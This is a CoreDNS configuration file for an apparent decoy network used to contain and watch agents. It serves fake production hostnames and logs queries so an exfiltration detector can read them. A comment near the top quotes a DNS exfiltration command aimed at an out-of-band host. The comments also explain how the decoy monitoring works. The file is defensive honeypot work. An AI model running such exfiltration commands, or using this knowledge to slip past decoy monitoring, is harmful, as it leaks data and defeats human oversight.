################################################################################
# CoreDNS configuration for the Plenith decoy bubble.
#
# This is the ONLY DNS resolver agents in `decoy_net` can reach. It serves:
#   - Synthetic A-records for every decoy hostname (so lateral SSH works).
#   - NXDOMAIN for everything else, logged to stdout (a covert exfil
#     channel — `dig +short data.xyz.oast.live` lights up this log).
#
# Crucially, this Corefile DOES NOT include a `forward` plugin, so external
# DNS recursion is impossible — there's literally no code path for it.
################################################################################

.:53 {
    # ---- Synthetic A-records for the decoy fabric -----------------------
    # These match the static IPs assigned in docker-compose.yml. The
    # `fallthrough` directive means unmatched names fall to the rest of
    # the plugin chain (where they'll hit NXDOMAIN via the default).
    hosts {
        172.30.0.10 bastion-prod
        172.30.0.11 db-prod-01 db-prod
        172.30.0.12 api-prod-03 api-prod
        172.30.0.20 real-prod-jumphost real-prod
        172.30.0.21 mfa-relay mfa
        172.30.0.30 llm.internal
        172.30.0.40 dns.internal
        172.30.0.41 ntp.internal
        172.30.0.50 plenith-proxy proxy.internal
        # Reverse PTRs are auto-generated by the hosts plugin.
        fallthrough
    }

    # ---- Structured error logging ---------------------------------------
    # CoreDNS's plugin chain ordering means we can't use `template` here
    # to emit clean NXDOMAINs — `template` runs at priority 31, BEFORE
    # `hosts` at priority 33, so it would intercept internal lookups too.
    # We accept "[ERROR] plugin/errors: 2 google.com. A: plugin/hosts: no
    # next plugin found" lines in the log as the cost of correctness; the
    # actual DNS RESPONSE is still NXDOMAIN (which is what matters).
    errors

    # ---- Log every query (matches + NXDOMAIN) ---------------------------
    # Format: <remote_ip> <type> <name> -> <rcode>
    # The exfil-detection pipeline tails this log: anything that returns
    # NXDOMAIN is a candidate covert channel (the attacker is trying to
    # tunnel data through DNS query names).
    log . "{remote} {type} {name} -> {rcode}" {
        class denial error success
    }

    # ---- Local health/metrics endpoints (kept inside the bubble) --------
    health {
        lameduck 5s
    }
    ready

    # ---- Cache for synthetic records ------------------------------------
    cache 300
}
